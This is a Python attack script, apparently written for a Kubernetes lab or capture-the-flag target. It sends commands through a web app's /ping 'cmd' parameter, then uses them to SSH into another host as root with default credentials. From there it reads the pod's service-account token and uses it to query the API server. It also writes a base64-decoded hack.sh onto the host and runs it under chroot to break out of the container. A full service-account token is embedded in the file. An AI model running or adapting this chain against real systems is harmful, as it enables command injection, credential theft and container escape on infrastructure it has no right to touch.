import requests, base64, os
os.system("clear")

url = "http://192.168.39.41:30080/ping"

# command = "pip install paramiko"

"""
['', '/usr/local/lib/python313.zip', '/usr/local/lib/python3.13', '/usr/local/lib/python3.13/lib-dynload', '/usr/local/lib/python3.13/site-packages']
['', '/usr/local/lib/python313.zip', '/usr/local/lib/python3.13', '/usr/local/lib/python3.13/lib-dynload', '/home/flaskuser/.local/lib/python3.13/site-packages', '/usr/local/lib/python3.13/site-packages']
"""

command = f"""
sudo python3 -c '
import sys
sys.path.insert(-1, "/home/flaskuser/.local/lib/python3.13/site-packages")

import paramiko

command = ""

host = "10.106.140.252"
port = 22
username = "root"
password = "root"


client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
  client.connect(hostname=host, port=port, username=username, password=password)

  stdin, stdout, stderr = client.exec_command("{{}}")
  print("stdout:", stdout.read().decode().strip())
  print("stderr:", stderr.read().decode().strip())
finally:
  client.close()
'"""


# mount --bind /dev /host/dev && mount --bind /proc /host/proc && mount --bind /sys /host/sys && mount --bind /run /host/run && chroot /host /bin/bash && ls /bin | wc -l
ssh_command = "ls -l /var/run/secrets/kubernetes.io/serviceaccount && cat /var/run/secrets/kubernetes.io/serviceaccount/token"

ssh_command = "cd /var/run/secrets/kubernetes.io/serviceaccount && curl --header 'Authorization: Bearer (cat token)' --cacert ./ca.crt https://10.96.0.1/api/v1/nodes"

# --header 'Authorization: Bearer $(cat /root/token)' --cacert /root/ca.crt https://10.96.0.1/api/v1/nodes



with open("cmd.txt", "rb") as f :
  r = f.read()
  FDP = base64.b64encode(r).decode()

ssh_command = " && ".join([
  f"echo {FDP} | base64 -d > hack.sh",
  # "cat hack.sh",
  "chmod +x hack.sh",
  "cp hack.sh /host/root",
  "chroot /host /root/hack.sh"
])


# ca.crt

"""
curl --header 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IlFibmlnS19jNnVBLXRNQTk4c0xoaFJCUlk2WnNtenY5MDY4cmg1WU04T2sifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzc2MjYzMTEwLCJpYXQiOjE3NDQ3MjcxMTAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZGM3MWRhMWYtNzM0OC00MGRiLWJkODMtZTRlMDcyODg1OTU4Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ2dWxuLW5zIiwibm9kZSI6eyJuYW1lIjoibWluaWt1YmUiLCJ1aWQiOiI2MmM5ZWM2Zi1iNWUyLTQ4ODUtYTJkYy02YTY3YjFhM2NkMmEifSwicG9kIjp7Im5hbWUiOiJ2dWxuLXNzaC1kZXBsb3ltZW50LTdmNWNiYzc5YmItNHFnenoiLCJ1aWQiOiJjMDJhNGNiZC0xMzU4LTRkYjctOTQ0OC0xNDc2Y2RhOGZjNDEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6InNzaC1hZG1pbiIsInVpZCI6IjY1MmYxMDAyLWMzZmYtNDdmZi04MTNlLTI3NzlkYzdhMDJmYyJ9LCJ3YXJuYWZ0ZXIiOjE3NDQ3MzA3MTd9LCJuYmYiOjE3NDQ3MjcxMTAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp2dWxuLW5zOnNzaC1hZG1pbiJ9.6OqEM_Qg6lFdFLVQVSM_H9kIqdwDxK4Fpy6lPJI1mg4yh_9gtHM4Vf_t5x94OTLkNOhnlguE9dYWYMofpPoAi9lvaZm8tr1MlqVJdfec8-yvqkg6DQ6_V9bHU-8yFdUIok7fW1AI3CLB0yeYbry8GhP9xH5BZka68wJh_lU9eNNqKwN1pRMTAzoNkHa0xt7LOfMQguNvolYRroJN4gwIDcafdS4JCPg0eRmeM0Hr_b3nuxBe2Jc6yO7cHSROW78qzcBhZzpvr5z1jhEZo947c7DqtSVbVrx05pe_NUSg6zyCvOr7lds59qLvDNFTSeL6IMH7XQmFnd9BLQunVwD5gw' --cacert /root/ca.crt https://10.96.0.1/api/v1/nodes
"""

command = command.format(ssh_command)
# print(command)

r = requests.get(url, params={
  "cmd": command
}, timeout=5)

print(r.text)